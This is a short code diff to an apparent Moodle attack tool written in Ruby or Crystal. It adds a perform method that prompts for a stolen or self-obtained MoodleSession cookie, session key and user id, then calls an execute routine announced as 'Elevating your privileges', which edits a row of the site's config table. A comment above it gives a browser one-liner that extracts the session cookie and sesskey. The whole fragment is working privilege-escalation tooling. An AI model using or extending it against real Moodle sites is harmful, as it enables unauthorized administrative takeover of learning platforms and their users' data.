@@ -16,6 +16,16 @@ module TMoodleActions
     # Then paste this:
     # alert("MoodleSession: " + document.cookie.match(new RegExp('(^| )MoodleSession=([^;]+)'))[2] + "\nSessKey: " + M.cfg.sesskey + "\nUser id: " + document.querySelectorAll('[data-userid]')[0].getAttribute("data-userid"))
     # Or paste it into the Dev Tools console.
+    def perform(url)
+      puts "Enter MoodleSession. Use helper command if needed."
+      moodle_session = gets().not_nil!
+      puts "Enter session key"
+      sess_key = gets().not_nil!
+      puts "Enter your user id"
+      user_id = gets().not_nil!
+      puts "Elevating your privileges"
+      execute(url, moodle_session, sess_key, value = user_id)
+    end
 
     def execute(url, moodle_session, sess_key, table = "config", row_id = 25, column = "value", value = 3)
       # table = "config" # table to update
